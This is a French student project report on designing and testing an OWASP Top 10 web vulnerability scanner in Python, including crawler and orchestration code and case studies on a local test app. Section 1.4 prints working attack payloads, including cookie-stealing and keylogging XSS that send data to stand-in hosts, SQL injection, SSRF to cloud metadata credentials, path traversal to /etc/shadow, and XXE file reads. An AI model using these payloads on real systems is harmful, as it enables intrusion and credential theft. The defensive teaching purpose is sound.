Introduction Générale
La transformation numérique accélérée des dernières décennies a profondément modifié le paysage de la sécurité informatique. Les organisations déplacent massivement leurs services vers le web, exposant des applications critiques à un Internet de plus en plus hostile. En 2023, le coût moyen d'une violation de données a atteint 4,45 millions de dollars selon IBM, un chiffre en hausse de 15 % en trois ans. Les applications web constituent le vecteur d'entrée privilégié des attaquants : simples d'accès, souvent mal sécurisées, elles représentent aujourd'hui 43 % des vecteurs d'attaque initiaux selon le rapport Verizon DBIR 2023.
Face à cette réalité, la détection proactive des vulnérabilités est devenue une nécessité absolue. Les équipes de développement et de sécurité cherchent des outils capables d'identifier rapidement les failles avant que des acteurs malveillants ne les exploitent. Cependant, les solutions professionnelles comme Burp Suite Pro ou Acunetix sont inaccessibles financièrement pour les PME et les projets académiques, tandis que les outils gratuits manquent souvent de couverture ou de facilité d'intégration.
C'est dans ce contexte que s'inscrit notre Projet de Fin d'Année (PFA) : la conception et le développement d'un scanner de vulnérabilités web automatisé, open source, léger et modulaire. Notre outil cible spécifiquement les dix catégories de vulnérabilités définies par le référentiel OWASP Top 10 2021 — la référence mondiale en matière de sécurité applicative web. Chaque faille détectée est automatiquement scorée selon le standard CVSS v3.1, et un rapport HTML professionnel est généré à l'issue du scan.
Ce rapport s'articule autour de trois chapitres :
Chapitre 1 — présente l'état de l'art : contexte des cybermenaces, panorama des vulnérabilités OWASP, comparaison des outils existants et positionnement de notre solution.
Chapitre 2 — expose la conception complète : architecture en pipeline, diagrammes UML (cas d'utilisation, classes, séquence), description des modules et choix technologiques.
Chapitre 3 — détaille la réalisation : environnement de test virtualisé (VMs), implémentation des modules en Python, interface CLI, suite de 42 tests, études de cas sur 8 vulnérabilités et analyse des 70 vulnérabilités détectées.
Chapitre 1 – État de l'Art
1.1  Contexte et Enjeux de la Sécurité des Applications Web
La sécurité des applications web est aujourd'hui au cœur des préoccupations des entreprises, des gouvernements et des organisations internationales. L'explosion du commerce électronique, des services cloud, des API REST et des architectures microservices a multiplié exponentiellement la surface d'attaque exposée sur Internet. Contrairement aux systèmes fermés, les applications web sont par nature accessibles à tous, rendant leur sécurisation particulièrement complexe.
1.1.1  Évolution des Cybermenaces
Les cyberattaques ciblant les applications web ont connu une évolution spectaculaire en termes de volume, de sophistication et d'impact. Les premières injections SQL documentées datent de 1998, mais le phénomène s'est massifié avec l'avènement du Web 2.0 et des applications dynamiques. Aujourd'hui, les attaquants combinent plusieurs techniques dans des chaînes d'exploitation complexes : un XSS permet de voler un cookie de session, qui donne accès à un back-office, depuis lequel une SSRF permet d'atteindre des services internes, et ainsi de suite.
Les ransomwares ciblant les applications web ont notamment connu une croissance de 95 % entre 2022 et 2023 selon CrowdStrike. Les attaques par injection représentent toujours le vecteur le plus utilisé, avec plus de 3,5 milliards de tentatives d'injection SQL bloquées chaque mois par les principaux WAF (Web Application Firewalls) mondiaux.

1.1.2  Impact Économique et Réglementaire
Les violations de données liées aux applications web engendrent des coûts colossaux. Selon le rapport IBM Cost of a Data Breach 2023, le coût moyen d'une violation de données est de 4,45 millions de dollars, avec une augmentation de 15,3 % sur trois ans. Les secteurs les plus touchés sont la santé (10,9 M$), la finance (5,9 M$) et le secteur pharmaceutique (4,8 M$). Au-delà des pertes financières directes, les entreprises subissent des atteintes à leur réputation, des sanctions réglementaires (RGPD : jusqu'à 4 % du chiffre d'affaires mondial) et des perturbations opérationnelles.

1.2  Panorama des Cybermenaces Web
Pour bien comprendre les vulnérabilités que notre scanner cherche à détecter, il est essentiel de dresser un panorama complet des menaces qui pèsent sur les applications web modernes. Ces menaces se classent en plusieurs catégories selon leur mécanisme d'exploitation et leur impact.
1.2.1  Attaques Man-in-the-Middle (MITM)
Les attaques Man-in-the-Middle (MITM, littéralement « l'homme du milieu ») constituent une menace fondamentale pour la confidentialité des communications web. Dans ce type d'attaque, un acteur malveillant s'interpose entre le client et le serveur pour intercepter, lire ou modifier les données en transit, à l'insu des deux parties.
Mécanismes d'attaque MITM les plus courants :
ARP Spoofing : empoisonnement du cache ARP pour rediriger le trafic réseau local vers la machine de l'attaquant.
DNS Spoofing : falsification des réponses DNS pour rediriger les utilisateurs vers des serveurs malveillants.
SSL Stripping : dégradation forcée d'une connexion HTTPS vers HTTP pour intercepter les données en clair.
Rogue Access Point : création d'un faux point d'accès Wi-Fi pour capturer tout le trafic des victimes connectées.
BGP Hijacking : détournement de routes BGP pour rediriger le trafic à l'échelle d'Internet.
Les protections contre les MITM incluent l'utilisation exclusive de HTTPS avec des certificats valides, l'activation de HSTS (HTTP Strict Transport Security) avec preloading, l'épinglage de certificats (Certificate Pinning) pour les applications mobiles, et la mise en place de l'authentification mutuelle (mTLS) pour les API critiques. Notre scanner détecte les failles cryptographiques (OWASP A02) liées à l'absence de HTTPS, aux cookies non sécurisés et aux formulaires de login servis en HTTP.

1.2.2  Attaques par Injection
Les attaques par injection représentent la menace la plus persistante et la plus documentée dans l'histoire de la sécurité web. Elles exploitent le fait qu'une application traite des données non fiables comme des instructions exécutables. Ce principe s'applique à de nombreux contextes : SQL, HTML/JavaScript, XML, commandes OS, LDAP, XPath, etc.
1.2.3  Attaques sur l'Authentification
Les failles d'authentification et de gestion de session permettent aux attaquants d'usurper l'identité d'utilisateurs légitimes. Les techniques incluent le brute force, l'utilisation de credentials par défaut, le vol de tokens de session, et le contournement de mécanismes d'authentification via des logiques applicatives défectueuses.
1.2.4  Attaques sur le Contrôle d'Accès
Les vulnérabilités de contrôle d'accès (OWASP A01 — la catégorie la plus fréquente en 2021) permettent à un utilisateur d'accéder à des ressources ou d'effectuer des actions qui ne lui sont pas autorisées. L'IDOR (Insecure Direct Object Reference) en est l'exemple le plus classique : un utilisateur change l'ID dans l'URL pour accéder au profil d'un autre utilisateur.
1.3  Le Référentiel OWASP Top 10 (2021)
L'OWASP (Open Web Application Security Project) est une fondation à but non lucratif fondée en 2001, dont la mission est d'améliorer la sécurité des logiciels. Elle réunit une communauté mondiale de plus de 250 000 membres, chercheurs et praticiens de la sécurité. Sa publication phare, l'OWASP Top 10, est mise à jour tous les 3 à 4 ans et représente le consensus de la communauté sur les dix risques les plus critiques pour les applications web. Elle est devenue une référence incontournable adoptée par les réglementations (PCI DSS, ISO 27001, NIST) et les programmes de formation.
L'édition 2021 a introduit trois nouvelles catégories (A04 Insecure Design, A08 Software & Data Integrity, A10 SSRF) et reorganisé plusieurs catégories existantes suite à l'analyse de données provenant de plus de 500 000 applications.

1.4  Vulnérabilités Ciblées : Mécanismes et Impacts
1.4.1  SQL Injection (SQLi) — OWASP A03
L'injection SQL est l'une des vulnérabilités les plus anciennes et les plus dangereuses. Elle survient lorsque des données utilisateur non validées sont incorporées directement dans des requêtes SQL, permettant à un attaquant de manipuler la logique de la base de données. La première description formelle date de 1998 (Jeff Forristal), et malgré 25 ans de sensibilisation, les injections SQL restent parmi les vecteurs d'attaque les plus fréquents, responsables de brèches majeures (Sony PlayStation Network 2011, Yahoo 2012, Ashley Madison 2015).
Trois variantes principales existent :
SQLi basée sur les erreurs : L'application retourne des messages d'erreur SQL directs, révélant la structure de la base.
SQLi basée sur le temps : L'application est vulnérable mais ne renvoie pas d'erreurs — on utilise des délais (SLEEP, WAITFOR) pour déduire les informations bit à bit.
SQLi booléenne : En injectant des conditions TRUE/FALSE, on observe si la réponse change pour déduire des informations sans messages d'erreur.
Code : Exemples de payloads SQL Injection classiques
-- Authentification bypass classique' OR '1'='1' OR '1'='1'--admin'---- Extraction de données (UNION-based)' UNION SELECT username, password, NULL FROM users---- Time-based (MySQL)' AND SLEEP(5)---- Time-based (MSSQL)'; WAITFOR DELAY '0:0:5'---- Time-based (PostgreSQL)' OR pg_sleep(5)--
Impact : lecture complète de la base de données, modification ou suppression de données, contournement de l'authentification, exécution de commandes OS (via xp_cmdshell sur MSSQL). Score CVSS v3.1 : 9.8 (Critique).
1.4.2  Cross-Site Scripting (XSS) — OWASP A03
Le XSS permet à un attaquant d'injecter du code JavaScript malveillant dans les pages web vues par d'autres utilisateurs. C'est l'une des vulnérabilités les plus répandues sur le web, présente dans près de 75 % des sites selon WhiteHat Security.
XSS Réfléchi (Reflected) : Le payload est inclus dans l'URL et reflété immédiatement dans la réponse. Nécessite d'inciter la victime à cliquer sur un lien malveillant.
XSS Persistant (Stored) : Le payload est stocké en base de données (commentaire, profil) et servi à tous les visiteurs. Beaucoup plus dangereux car automatique.
XSS basé sur le DOM : Exploitation du DOM côté client sans passer par le serveur — le payload ne transite pas dans la réponse HTTP.
Code : Exemples de payloads XSS
<!-- XSS basique — vol de cookie --><script>document.location='http://attacker.com/steal?c='+document.cookie</script><!-- XSS — keylogger --><script>document.onkeypress=function(e){new Image().src='http://evil.com/?k='+e.key}</script><!-- XSS — bypass de filtres --><img src=x onerror=alert(1)><svg onload=alert(document.domain)><body onpageshow=alert(1)>
1.4.3  IDOR — Broken Access Control (OWASP A01)
L'Insecure Direct Object Reference (IDOR) se produit lorsqu'une application expose des références directes à des objets internes (identifiants numériques séquentiels, noms de fichiers, clés de base de données) sans vérifier que l'utilisateur est autorisé à y accéder. C'est la catégorie la plus fréquente en 2021 (94 % des applications testées présentaient une forme de broken access control).
Code : Exemples d'IDOR
-- Accès au profil d'un autre utilisateurGET /api/users/1337/profile      -> données de l'utilisateur 1337GET /api/users/1338/profile      -> données d'un autre utilisateur (IDOR)-- Accès aux factures d'un autre compteGET /invoices/download?id=1001   -> votre factureGET /invoices/download?id=1002   -> facture d'un autre client (IDOR)
1.4.4  SSRF — Server-Side Request Forgery (OWASP A10)
Le SSRF force le serveur web à effectuer des requêtes HTTP vers des destinations contrôlées par l'attaquant. Dans les environnements cloud modernes (AWS, GCP, Azure), cela permet d'accéder aux services de métadonnées d'instance (169.254.169.254 sur AWS), qui exposent des credentials IAM temporaires donnant accès à l'ensemble de l'infrastructure cloud. La vulnérabilité Capital One (2019, 100 M dossiers clients volés) était une SSRF.
Code : Exemples de payloads SSRF
-- SSRF vers métadonnées AWShttp://169.254.169.254/latest/meta-data/iam/security-credentials/-- SSRF vers métadonnées GCPhttp://metadata.google.internal/computeMetadata/v1/-- SSRF vers services interneshttp://127.0.0.1:8080/adminhttp://10.0.0.1/confighttp://internal-db:5432/
1.4.5  Path Traversal (OWASP A01)
Le Path Traversal (ou Directory Traversal) exploite une validation insuffisante des chemins de fichiers pour accéder à des fichiers arbitraires sur le serveur, en dehors du répertoire prévu. L'attaquant utilise des séquences '../' pour remonter l'arborescence et accéder à des fichiers système sensibles (/etc/passwd, /etc/shadow, les clés SSH, les fichiers de configuration d'application).
Code : Exemples de payloads Path Traversal
-- Path Traversal basiqueGET /download?file=../../etc/passwdGET /download?file=..%2F..%2Fetc%2Fshadow-- Encodages alternatifs (bypass de filtres)..%252f..%252fetc%252fpasswd     (double encodage URL)....//....//etc/passwd            (variation)..%c0%af..%c0%afetc%c0%afpasswd  (encodage UTF-8 overlong)
1.4.6  XXE — XML External Entity (OWASP A05)
Lorsqu'un parseur XML traite des entités externes définies dans le DTD (Document Type Definition) d'un document XML fourni par l'utilisateur, il peut divulguer des fichiers locaux, effectuer des requêtes SSRF, ou même provoquer un déni de service (Billion Laughs Attack). Les frameworks modernes désactivent généralement le traitement des entités externes par défaut, mais des configurations héritées ou mal configurées restent vulnérables.
Code : Exemples de payloads XXE
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///etc/passwd">]><request>  <username>&xxe;</username></request><!-- XXE via SSRF --><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><!-- Billion Laughs (DoS) --><!DOCTYPE bomb [  <!ENTITY a "aaaa...aaaa">  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">  ...]>
1.4.7  Upload de Fichier Non Sécurisé (OWASP A04)
Les fonctionnalités d'upload de fichiers, si elles ne valident pas strictement le type et le contenu des fichiers acceptés, peuvent permettre à un attaquant d'uploader un web shell (fichier PHP, JSP, ASP malveillant) directement exécutable par le serveur. Il suffit alors de naviguer vers l'URL du fichier uploadé pour exécuter des commandes arbitraires sur le serveur avec les privilèges du processus web.
Les validations insuffisantes courantes : vérification de l'extension côté client uniquement (contournable), vérification du Content-Type HTTP (falsifiable), absence de vérification des magic bytes (signatures binaires des formats de fichiers).
1.4.8  Failures d'Authentification (OWASP A07)
Les failles d'authentification incluent l'utilisation de credentials par défaut (admin/admin, admin/password), l'absence de rate limiting sur les formulaires de login (permettant le brute force), la transmission de mots de passe en clair (HTTP au lieu d'HTTPS), les sessions sans expiration, et l'absence de mécanismes MFA. Ces failles sont particulièrement critiques car elles permettent souvent une compromission complète du compte ciblé.
1.5  Outils de Scan Existants — Analyse Comparative
Le marché des outils de scan de vulnérabilités web est divisé entre solutions professionnelles onéreuses et outils open source aux capacités plus limitées. Nous analysons ici les quatre solutions les plus répandues afin de positionner notre approche.
1.5.1  OWASP ZAP (Zed Attack Proxy)
OWASP ZAP est le scanner de sécurité web open source le plus utilisé au monde. Développé et maintenu par l'OWASP depuis 2010, il propose deux modes principaux : un proxy intercepteur permettant d'analyser manuellement le trafic HTTP/HTTPS, et un mode daemon/API pour l'intégration dans des pipelines CI/CD. ZAP dispose d'une architecture extensible via des add-ons communautaires et d'une API REST complète.
Points forts : open source, communauté active (500+ contributeurs), extensible via 50+ add-ons, API REST pour CI/CD, scans actif et passif, authentification avancée.
Limites : interface graphique complexe, lent sur les grandes applications (pas de parallélisme natif), configuration initiale fastidieuse, faux positifs nombreux sur les applications complexes.
1.5.2  Burp Suite (PortSwigger)
Burp Suite est la référence professionnelle absolue pour les tests d'intrusion web. Développé par PortSwigger, il combine un proxy intercepteur, un spider, un scanner automatisé, un répéteur de requêtes, un intrus (fuzzer), un décodeur et un comparateur. La version Community est gratuite mais dépourvue du scanner automatisé ; la version Professional (449 USD/an/utilisateur) offre un scanner complet avec corrélation des vulnérabilités et génération de rapports professionnels.
Points forts : le plus complet du marché, très fiable (peu de faux positifs), outils manuels avancés, extensible via BApp Store (200+ extensions), intégration CI/CD en Enterprise.
Limites : version complète très onéreuse (4 490 USD/an Enterprise), fermé et propriétaire, scanner indisponible en version gratuite, courbe d'apprentissage importante.
1.5.3  Nikto
Nikto est un scanner web léger et rapide en ligne de commande, écrit en Perl. Il se concentre principalement sur la détection de fichiers sensibles exposés, de versions de serveurs obsolètes, de configurations dangereuses et de pages d'administration accessibles. Il n'est pas conçu pour la détection de vulnérabilités applicatives comme les injections SQL ou XSS.
Points forts : rapide (< 30s), simple d'utilisation, open source, bonne couverture des misconfigurations.
Limites : pas de détection SQLi/XSS/SSRF, pas d'authentification, beaucoup de faux positifs, non maintenu activement.
1.5.4  Acunetix / Invicti
Acunetix (acquis par Invicti Security) est un scanner commercial haut de gamme proposant une couverture étendue de l'OWASP Top 10, une interface web moderne, des rapports détaillés avec preuve de concept, et une intégration avec les principaux outils DevOps (Jira, GitHub, Azure DevOps). Son moteur DeepScan supporte les applications JavaScript SPA et les APIs REST/GraphQL.
Points forts : couverture très étendue, support SPA/API, rapports professionnels, peu de faux positifs.
Limites : prix très élevé (5 000–25 000 USD/an), propriétaire, non accessible pour projets académiques.

1.6  Standards de Scoring : CVSS v3.1
Le Common Vulnerability Scoring System (CVSS) est un standard industriel ouvert pour évaluer la sévérité des vulnérabilités de sécurité. Développé par le FIRST (Forum of Incident Response and Security Teams), CVSS v3.1 est la version actuelle, adoptée par le NVD (National Vulnerability Database), les principaux éditeurs de sécurité et les réglementations sectorielles.
Le score CVSS v3.1 est calculé à partir de métriques regroupées en trois groupes : le groupe Base (intrinsèque à la vulnérabilité), le groupe Temporel (évolution dans le temps) et le groupe Environnemental (spécifique au contexte d'utilisation). Notre outil utilise les scores Base pour scorer chaque vulnérabilité détectée.

1.7  Techniques de Détection Automatique
1.7.1  Crawling et Découverte d'Endpoints
La première étape de tout scanner web est la découverte des surfaces d'attaque : l'ensemble des URLs, formulaires, paramètres GET/POST et endpoints d'API exposés par l'application cible. On distingue deux approches : le crawling statique (analyse du HTML retourné) et le crawling dynamique (exécution du JavaScript via un navigateur headless comme Playwright ou Puppeteer). Notre outil utilise un crawling statique BFS (Breadth-First Search) adapté aux applications majoritairement server-rendered.
1.7.2  Scan Actif vs Scan Passif
Scan passif : analyse le trafic HTTP existant sans générer de requêtes supplémentaires. Non intrusif, il peut être intégré en production (proxy mode ZAP). Limité en couverture car ne teste que les paramètres effectivement utilisés par l'utilisateur légitime.
Scan actif : envoie des requêtes spécialement forgées (payloads) pour provoquer des comportements révélateurs de vulnérabilités. Plus efficace en couverture mais intrusif — ne doit être utilisé que sur des environnements de test. Notre outil adopte cette approche.
1.7.3  Fuzzing et Wordlists
Le fuzzing consiste à injecter des données semi-aléatoires ou basées sur des dictionnaires (wordlists) dans les paramètres d'entrée pour provoquer des comportements anormaux révélant des vulnérabilités. Notre outil utilise des wordlists ciblées pour chaque type de vulnérabilité, organisées dans le répertoire payloads/ :
sqli.txt : payloads SQLi (error-based, time-based, boolean, UNION) — 50+ entrées
xss.txt : payloads XSS avec variations d'encodage et bypass de filtres — 40+ entrées
ssrf.txt : URLs de métadonnées cloud, IPs internes, loopback — 30+ entrées
path_traversal.txt : séquences ../ avec encodages multiples — 25+ entrées
xxe.txt : payloads XML avec entités externes file:// et http:// — 15+ entrées
1.7.4  Détection par Signatures
Chaque type de vulnérabilité génère des réponses caractéristiques détectables par analyse de signatures. Notre moteur de détection utilise des expressions régulières compilées (module re de Python) pour identifier ces marqueurs dans les réponses HTTP. Par exemple, pour les injections SQL, nous recherchons plus de 14 patterns d'erreurs couvrant MySQL, PostgreSQL, MSSQL, Oracle et SQLite.
1.8  Synthèse et Positionnement
L'analyse des outils existants met en évidence un vide dans l'offre actuelle : les solutions professionnelles (Burp Suite Pro, Acunetix) sont trop onéreuses pour les contextes académiques et les petites équipes, tandis que les outils gratuits (Nikto, ZAP) manquent soit de couverture, soit d'intégration facile dans un workflow Python/CI-CD. Notre scanner se positionne précisément dans cet espace.
Positionnement de notre scanner OWASP Top 10

2.1  Architecture Générale du Système
Notre scanner adopte une architecture en pipeline à cinq étapes, où chaque étape consomme la sortie de l'étape précédente. Cette approche garantit une séparation stricte des responsabilités : le module de crawling ne connaît pas la logique de détection, les détecteurs ignorent comment le rapport est généré, etc. Chaque module peut être testé, remplacé ou étendu indépendamment.

2.1.1  Principes de Conception Retenus
Responsabilité Unique (SRP) : Chaque module (crawler, détecteur, evaluator, reporter) a une responsabilité unique et clairement définie.
Ouvert/Fermé (OCP) : L'ajout d'un nouveau détecteur n'impose aucune modification du code existant — il suffit de créer une nouvelle classe héritant de BaseDetector.
Substitution de Liskov (LSP) : Tous les détecteurs exposent la même interface scan(endpoint) -> list[Vulnerability].
Injection de dépendances : Les modules sont instanciés avec une session requests partagée, permettant la réutilisation des cookies d'authentification.

2.5  Description Détaillée des Modules
2.5.1  Module Crawler
Le Crawler est le premier maillon du pipeline. Son rôle est de découvrir exhaustivement tous les points d'entrée testables de l'application cible : URLs avec paramètres GET, formulaires POST (login, recherche, upload), et endpoints d'API. Il utilise un algorithme BFS (file FIFO) pour explorer l'application de manière ordonnée et contrôlée en termes de profondeur et de nombre de pages visitées.
Le Crawler extrait les types d'endpoints suivants :
URLs avec paramètres GET : /search?q=test, /profile?id=1
Formulaires HTML (GET et POST) : champs text, password, hidden, select, textarea
Formulaires multipart (enctype=multipart/form-data) : upload de fichiers
Liens internes filtrés : exclusion des liens logout, javascript:, mailto:
La déduplication des endpoints se fait via une signature unique : METHOD:URL?sorted_params. Deux formulaires pointant vers la même URL avec les mêmes champs ne génèrent qu'un seul endpoint.
2.5.2  Module BaseDetector (Classe Abstraite)
BaseDetector est la classe de base dont héritent tous les détecteurs actifs. Elle implémente le pattern Template Method : la méthode scan_all() orchestre la boucle sur tous les endpoints et appelle la méthode abstraite scan() implémentée par chaque sous-classe.
Services fournis par BaseDetector à toutes les sous-classes :
_send(url, method, params, data, headers) : envoi HTTP avec gestion des erreurs
_iter_injection_points(endpoint) : itère sur tous les paramètres injectables
Chargement automatique des payloads depuis payloads/<name>.txt au démarrage
scan_all(endpoints) : boucle principale + déduplication par signature

3.2  Implémentation Détaillée des Modules
3.2.1  Orchestrateur Principal (scanner/core.py)
La classe Scanner orchestre l'ensemble du pipeline en cinq phases séquentielles. Elle gère également l'authentification optionnelle (DVWA ou formulaire générique) avant le début du crawl, et assure la déduplication des vulnérabilités détectées par plusieurs détecteurs sur le même endpoint.
Code : Méthode Scanner.run() — orchestration du pipeline (scanner/core.py)
class Scanner:    def run(self) -> list[Vulnerability]:        start = time.perf_counter()        logger.info("Démarrage du scan sur %s", self.url)        # Phase 0 : Authentification (optionnelle)        self._maybe_login()        # Phase 1 : Crawling        crawler = Crawler(base_url=self.url, max_depth=self.options.depth,                          max_pages=self.options.max_pages, session=self.session)        endpoints = crawler.crawl()        self.pages_scanned = len(crawler.visited)        # Phase 2 : Détection (12 détecteurs en séquence)        raw_vulns: list[Vulnerability] = []        for name in (self.options.only or list(ALL_DETECTORS.keys())):            cls = ALL_DETECTORS.get(name)            detector = cls(session=self.session, timeout=self.options.timeout)            targets = passive_endpoints if isinstance(detector, PassiveDetector) else endpoints            raw_vulns.extend(detector.scan_all(targets))        # Phase 3 : Déduplication        deduped = self._deduplicate(raw_vulns)        # Phase 4 : Évaluation CVSS        self.vulnerabilities = CVSSEvaluator().evaluate_all(deduped)        # Phase 5 : Rapport HTML        self.duration = time.perf_counter() - start        self._report_path = HTMLReporter(self.options.output).save(            self.vulnerabilities, target_url=self.url,            duration=self.duration, pages_scanned=self.pages_scanned)        return self.vulnerabilities
3.2.2  Crawler BFS (crawler/crawler.py)
Le Crawler utilise une file FIFO (collections.deque) pour explorer l'application en largeur d'abord. Chaque URL visitée est canonisée (suppression des paramètres query) avant d'être ajoutée à l'ensemble visited, évitant ainsi les visites redondantes. Les endpoints sont dédupliqués par signature.
Code : Algorithme BFS complet du Crawler (crawler/crawler.py)
@dataclassclass Endpoint:    url: str    method: str = "GET"    params: dict[str, str] = field(default_factory=dict)       # paramètres GET    form_fields: dict[str, str] = field(default_factory=dict)  # champs POST    file_fields: list[str] = field(default_factory=list)       # champs file    enctype: str = ""    def signature(self) -> str:        keys = ",".join(sorted(self.params.keys() | self.form_fields.keys()))        return f"{self.method}:{self.url}?{keys}"def crawl(self) -> list[Endpoint]:    queue: deque[tuple[str, int]] = deque([(self.base_url, 0)])    seen_signatures: set[str] = set()    while queue and len(self.visited) < self.max_pages:        url, depth = queue.popleft()        canonical = _strip_query(url)        if canonical in self.visited or depth > self.max_depth:            continue        self.visited.add(canonical)        resp = self._fetch(url)        if resp is None or "html" not in resp.headers.get("Content-Type",""):            continue        soup = BeautifulSoup(resp.text, "html.parser")        # Extraction des paramètres GET depuis l'URL courante        qs = parse_qs(urlparse(url).query, keep_blank_values=True)        if qs:            params = {k: v[0] for k, v in qs.items()}            ep = Endpoint(url=canonical, method="GET", params=params)            if ep.signature() not in seen_signatures:                seen_signatures.add(ep.signature())                self.endpoints.append(ep)        # Extraction des formulaires        for form in soup.find_all("form"):            ep = self._parse_form(form, url)            if ep and ep.signature() not in seen_signatures:                seen_signatures.add(ep.signature())                self.endpoints.append(ep)        # Suivi des liens internes        for a in soup.find_all("a", href=True):            href = a["href"].strip()            if any(href.startswith(p) for p in ("javascript:", "mailto:", "tel:", "#")):                continue            if "logout" in href.lower():                continue            next_url = urljoin(url, href)            if _same_domain(next_url, self.base_url):                queue.append((next_url, depth + 1))    return self.endpoints

3.2.4  Authenticator (scanner/authenticator.py)
Le module Authenticator gère deux modes d'authentification : le mode DVWA (login spécialisé avec gestion du token CSRF user_token de DVWA et réglage du niveau de sécurité) et le mode générique (détection automatique du formulaire de login et soumission des credentials).
Code : Fonction login_dvwa() (scanner/authenticator.py)
def login_dvwa(session, base_url, username="admin", password="password",               security="low", timeout=10) -> bool:    login_url = base_url.rstrip("/") + "/login.php"    # 1) Récupérer le token CSRF    r = session.get(login_url, timeout=timeout)    soup = BeautifulSoup(r.text, "html.parser")    token = ""    if inp := soup.find("input", {"name": "user_token"}):        token = inp.get("value", "")    # 2) Soumettre le formulaire    resp = session.post(login_url, data={        "username": username, "password": password,        "Login": "Login", "user_token": token    }, timeout=timeout)    success = "logout" in resp.text.lower() or "welcome" in resp.text.lower()    if success and security != "":        # 3) Régler le niveau de sécurité DVWA        sec_url = base_url.rstrip("/") + "/security.php"        sr = session.get(sec_url, timeout=timeout)        soup2 = BeautifulSoup(sr.text, "html.parser")        t2 = soup2.find("input", {"name": "user_token"})        token2 = t2.get("value", "") if t2 else ""        session.post(sec_url, data={"seclev_submit": "Submit",            "security": security, "user_token": token2}, timeout=timeout)    return success

3.5  Scénarios de Test — Études de Cas
Les huit études de cas suivantes ont été réalisées sur l'application Flask de test locale (http://127.0.0.1:5001), lancée via run_vuln_app.py. Chaque étude présente la cible, le mécanisme de détection, le payload utilisé, la preuve collectée, le score CVSS attribué et la recommandation de remédiation générée.
3.5.1  Étude de Cas 1 : Injection SQL (OWASP A03) — CVSS 9.8 CRITIQUE
Cible : http://127.0.0.1:5001/search?q=...   |   Méthode : GET   |   Paramètre : q
Le paramètre q est concaténé directement dans la requête SQL : SELECT * FROM users WHERE name='<input>'. L'absence totale de validation permet l'injection de n'importe quelle syntaxe SQL.
Déroulement de la détection (3 phases) :
Phase 1 — Error-based : Le scanner envoie le payload simple '. La réponse contient 'You have an error in your SQL syntax' : vulnérabilité confirmée par erreur directe.
Phase 2 — Time-based : Si aucune erreur n'était visible, le scanner tenterait ' AND SLEEP(5)-- et mesurerait le délai de réponse (seuil : 4,5s).
Phase 3 — Booléenne : Dernier recours : comparaison des longueurs de réponse entre ' OR '1'='1 (condition vraie) et ' AND '1'='2 (condition fausse).
Code : Résultat — SQL Injection
Payload injecté  : 'Réponse serveur  : HTTP 500 — "Error: near "'": syntax error (SQLite)"URL complète     : http://127.0.0.1:5001/search?q='Score CVSS       : 9.8 — CritiqueVecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:HImpact           : Accès complet à la base de données (lecture, modification, suppression)
Remédiation : Remplacer la concaténation SQL par des prepared statements : cursor.execute('SELECT * FROM users WHERE name=?', (q,)) en SQLite, cursor.execute('SELECT * FROM users WHERE name=%s', (q,)) en MySQL/PostgreSQL. Appliquer le principe du moindre privilège sur le compte de base de données.
3.5.2  Étude de Cas 2 : XSS Réfléchi (OWASP A03) — CVSS 6.1 MOYEN
Cible : http://127.0.0.1:5001/greet?name=...   |   Paramètre : name
L'endpoint /greet retourne le paramètre name directement dans le HTML sans encodage : return f'<h1>Hello {name}</h1>'. Tout contenu HTML fourni par l'utilisateur est reflété tel quel dans la réponse.
Code : Résultat — XSS Réfléchi
Payload          : <script>alert(document.cookie)</script>Réponse serveur  : <h1>Hello <script>alert(document.cookie)</script></h1>Preuve           : Payload '<script>' retrouvé littéralement dans la réponse HTTPURL              : http://127.0.0.1:5001/greet?name=<script>alert(document.cookie)</script>Score CVSS       : 6.1 — MoyenVecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:NImpact           : Vol de cookies de session, redirection malveillante, phishing
Figure 9 — Vulnérabilité XSS Réfléchi (A03) détectée : payload <script>alert(XSS)</script>, CVSS 6.1
Remédiation : Utiliser html.escape() en Python (return f'<h1>Hello {html.escape(name)}</h1>'), implémenter une Content-Security-Policy (CSP) stricte, utiliser un framework qui échappe automatiquement (Jinja2 avec autoescape=True).
3.5.3  Étude de Cas 3 : SSRF (OWASP A10) — CVSS 8.5 ÉLEVÉ
Cible : http://127.0.0.1:5001/fetch?url=...   |   Paramètre : url
Le serveur effectue requests.get(url) sans aucune validation de la destination. L'attaquant peut forcer le serveur à contacter des services internes inaccessibles depuis l'extérieur, ou des endpoints de métadonnées cloud.
Code : Résultat — SSRF (deux payloads)
Payload 1        : http://127.0.0.1Preuve           : Contenu interne retourné — 'ami-id' détecté dans la réponsePayload 2        : http://169.254.169.254/latest/meta-data/iam/security-credentials/Preuve           : 'security-credentials' détecté dans la réponseURL              : http://127.0.0.1:5001/fetch?url=http://127.0.0.1Score CVSS       : 8.5 — ÉlevéVecteur          : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:NImpact           : Accès aux metadata AWS/GCP (credentials IAM), services internes
Figure 8 — Vulnérabilité SSRF (A10) détectée : payload file:///etc/passwd, preuve root:x:0:0, CVSS 8.5
Remédiation : Implémenter une allowlist stricte des domaines autorisés, bloquer 127.0.0.1, 0.0.0.0, ::1, et les plages RFC 1918 (10.x, 172.16-31.x, 192.168.x), ainsi que 169.254.169.254 (AWS) et metadata.google.internal (GCP).
3.5.4  Étude de Cas 4 : Path Traversal (OWASP A01) — CVSS 7.5 ÉLEVÉ
Cible : http://127.0.0.1:5001/file?page=...   |   Paramètre : page
L'endpoint /file ouvre directement le fichier dont le chemin est fourni par l'utilisateur sans aucune validation ou restriction. L'attaquant peut remonter l'arborescence pour accéder à tout fichier lisible par le processus web.
Code : Résultat — Path Traversal
Payload          : ../../etc/passwdPreuve           : Contenu /etc/passwd retourné : 'root:x:0:0:root:/root:/bin/bash...'URL              : http://127.0.0.1:5001/file?page=../../etc/passwdScore CVSS       : 7.5 — ÉlevéVecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:NImpact           : Lecture de fichiers système (/etc/shadow, clés SSH, configs app)
Figure 7 — Vulnérabilité Path Traversal (A01) détectée : payload ../../../../../../etc/passwd, CVSS 7.5
3.5.5  Étude de Cas 5 : XXE (OWASP A05) — CVSS 8.2 ÉLEVÉ
